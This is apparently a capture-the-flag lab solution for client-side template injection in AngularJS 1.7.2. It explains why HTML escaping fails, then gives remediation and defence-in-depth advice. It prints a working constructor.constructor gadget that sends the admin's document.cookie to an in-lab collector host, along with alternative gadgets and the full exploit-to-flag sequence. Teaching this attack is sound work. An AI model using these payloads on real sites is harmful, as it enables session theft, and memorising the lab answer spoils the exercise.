# Solution — AngularJS 1.7.2 Client-Side Template Injection (sandbox-less)

## Classification

**CWE-79 / OWASP A03:2021 – Injection.** Specifically _client-side_ template
injection (CSTI): untrusted input is reflected into a region that a client-side
template engine (AngularJS) compiles and evaluates, so the input is treated as a
template **expression**, not merely as HTML.

## The sink

`GET /` HTML-escapes the `?name=` value and drops it into the text of an
AngularJS-compiled region:

```python
name = request.args.get("name") or "valued customer"
reflected = html.escape(name)                 # " and ' become entities too
return Response(_PAGE_HEAD + reflected + _PAGE_TAIL, ...)
# _PAGE_HEAD ends with:  <div ng-app><p>Order confirmed for
# _PAGE_TAIL starts with: . Thank you for shopping with us.</p></div>
```

`html.escape` is exactly what you would add to _fix_ a classic reflected XSS: it
turns `<`, `>`, `&`, `"`, `'` into entities, so `<script>` and `onerror=` are dead.
Confirm tag injection is blocked:

```
GET /?name=<b>x</b>   →  ...Order confirmed for &lt;b&gt;x&lt;/b&gt;...   (literal text)
```

But escaping does **nothing** to the `{{ }}` grammar. Two facts combine to make
this exploitable:

1. **The browser decodes entities before AngularJS parses.** The escaped output
   is inserted as _text_. The HTML parser turns `&quot;`→`"` and `&#x27;`→`'`
   inside the text node **first**; only then does AngularJS walk the compiled DOM
   and interpolate `{{ }}`. So the quotes inside your expression survive as real
   quotes. `html.escape` never touches `{` or `}`, so the interpolation delimiters
   pass through untouched.
2. **AngularJS 1.6+ has no expression sandbox.** The vendored `/vendor/lib.min.js`
   is AngularJS **1.7.2**. Older AngularJS (≤1.5) tried to block `Function`,
   `constructor`, `window`, etc. inside `{{ }}`; that sandbox was bypassed so many
   times that the maintainers **removed it in 1.6** and told users never to run
   Angular expressions on untrusted input. So a `{{ }}` expression here can reach
   the `Function` constructor directly.

Prove the engine evaluates your input:

```
GET /?name={{7*7}}   →  rendered page shows "Order confirmed for 49."
```

That `49` (not `{{7*7}}`) is the whole finding: your input is a live AngularJS
expression.

## The delivery model

You cannot read the admin's cookie from your own browser (same-origin policy
scopes `document.cookie`). You need the **admin's** browser to evaluate your
expression. `POST /report` is that capability: it queues a same-site path, and the
admin bot visits it every ~2s while logged in. The bot's session cookie is **not**
`HttpOnly`, so JS can read it.

## The payload

An AngularJS 1.7 constructor gadget that reaches `Function` and beacons the cookie:

```
{{constructor.constructor("new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)")()}}
```

- In an Angular expression the scope's `constructor` is the `Scope` function; its
  `.constructor` is `Function`. So `constructor.constructor("code")` is
  `Function("code")`, and the trailing `()` calls it — arbitrary JS, no sandbox.
- The **outer** string is double-quoted and the **inner** URL string is
  single-quoted. `html.escape` turns `"`→`&quot;` and `'`→`&#x27;`; the browser
  decodes both back inside the text node before AngularJS parses, so the gadget is
  syntactically intact when evaluated.
- `new Image().src = …` fires a cross-origin GET (image loads are not subject to
  the same-origin _read_ barrier — the request still goes out, which is all we
  need). `collector:9000` is the in-lab OOB listener.

Equivalent gadgets that also reach `Function` on 1.6/1.7 if you want to tune it:
`{{$eval.constructor("…")()}}`, `{{[].constructor.constructor("…")()}}`, or the
`toString`/`valueOf` chains. The app structure is fixed; only the gadget string
changes.

## End-to-end

```
POST /report      {"url":"/?name=<URL-encoded gadget above>"}
# wait for the bot to visit (~2s) + AngularJS bootstrap/digest (settle 2000ms)
GET  /oob/received       # app-side proxy to the collector; find /report?c=session%3D<32hex>
POST /solve       {"c":"<32hex>"}     →  FLAG{...}
```

`tests/exploit.py` automates this: sanity-check the escaped reflection and the
`ng-app` region → submit the gadget via `/report` → poll `/oob/received` → parse
the 32-hex session → `/solve`.

## Why the containment holds

- The collector and admin bot live on a `backend` network with `internal: true`
  — **no route off the host**. The stolen cookie can reach the in-lab collector
  but never the internet, so the lab ships a real cookie-exfil primitive at
  `risk: low`.
- The admin bot's cookie-minting endpoint (`/internal/bot-login`) is firewalled to
  the backend subnet (`_from_backend()`) **and** gated by a shared `BOT_KEY`, so a
  lab visitor on the public side cannot request the admin cookie via `Set-Cookie`
  and skip the CSTI.
- `/internal/queue` is likewise backend-only. The intended CSTI path is the _only_
  way to obtain the admin session.

## Fix

The instinct — "escape the output" — is already present here and does **not**
help: the data is not being interpreted as HTML, it is being interpreted as an
**AngularJS expression**. The correct fixes remove the interpolation context, not
the angle brackets:

1. **Keep untrusted data out of the compiled region.** Never emit user input into
   an `ng-app` / `ng-controller` subtree where `{{ }}` is live. Render the name
   _outside_ Angular (plain server-side templating that writes to a non-Angular
   part of the page), or mark the region `ng-non-bindable` so AngularJS does not
   interpolate it:
   ```html
   <p ng-non-bindable>Order confirmed for {{ escaped-name }}. …</p>
   ```
2. **If it must be inside Angular, bind it as data, not template.** Pass the name
   through a controller/`$scope` value and render it with a directive
   (`<span ng-bind="name">`) or `$sce.trustAsHtml` gating — never string-concatenate
   user input into the template source the compiler sees.
3. **Do not run a sandbox-less AngularJS on untrusted input at all.** AngularJS is
   end-of-life; 1.6+ explicitly has no expression sandbox. New code should not put
   any attacker-influenced string into an Angular expression context. (Upgrading
   the framework is _not_ a fix — there is no "safe" sandboxed version; the
   guidance is to not compile untrusted templates.)

Defence in depth that also blunts this specific chain: an **`HttpOnly`** session
cookie (so a successful expression still can't read `document.cookie`), a strict
**`Content-Security-Policy`**, and `SameSite` on the session cookie.
